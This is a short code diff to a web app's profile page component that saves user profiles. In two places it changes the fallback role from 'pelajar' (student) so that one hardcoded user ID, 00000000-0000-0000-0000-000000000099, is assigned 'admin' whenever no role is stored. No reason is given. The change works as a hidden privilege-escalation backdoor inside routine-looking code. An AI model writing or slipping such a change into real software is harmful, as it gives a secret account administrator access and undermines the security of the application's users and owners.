@@ -263,7 +263,7 @@ export default function ProfilePage() {
           username: (profile?.username || username).trim(),
           bio: bio.trim(),
           avatar_url: finalAvatarUrl.trim() || null,
-          role: profile?.role || 'pelajar',
+          role: profile?.role || (targetUserId === '00000000-0000-0000-0000-000000000099' ? 'admin' : 'pelajar'),
           status: profile?.status || 'approved',
           updated_at: new Date().toISOString(),
         })
@@ -278,7 +278,7 @@ export default function ProfilePage() {
         username: (profile?.username || username).trim(),
         bio: bio.trim(),
         avatar_url: finalAvatarUrl.trim() || null,
-        role: profile?.role || 'pelajar',
+        role: profile?.role || (targetUserId === '00000000-0000-0000-0000-000000000099' ? 'admin' : 'pelajar'),
         updated_at: new Date().toISOString(),
       }
 
